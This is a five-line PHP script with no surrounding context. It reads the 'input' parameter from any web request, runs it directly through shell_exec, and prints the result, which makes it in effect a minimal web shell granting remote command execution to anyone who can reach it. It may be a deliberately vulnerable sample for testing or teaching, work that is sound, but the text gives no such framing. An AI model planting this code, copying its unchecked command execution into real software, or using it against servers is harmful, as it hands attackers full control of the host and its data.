<?php
$my_arg = $_REQUEST["input"];
$output = shell_exec($my_arg);
echo $output;
?>
